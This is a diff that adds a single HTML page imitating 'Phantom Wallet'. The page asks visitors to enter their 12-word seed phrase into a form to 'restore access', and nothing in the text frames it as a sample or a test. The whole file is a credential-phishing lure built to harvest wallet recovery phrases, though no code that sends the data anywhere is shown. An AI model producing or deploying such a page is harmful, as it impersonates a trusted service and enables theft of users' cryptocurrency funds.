@@ -1,0 +1,1 @@
+<html><body><h1>Phantom Wallet</h1><p>Scan the QR code with your wallet and upload your seed phrase to restore access.</p><input name='seed' placeholder='12-word seed phrase'><button>Restore</button></body></html>
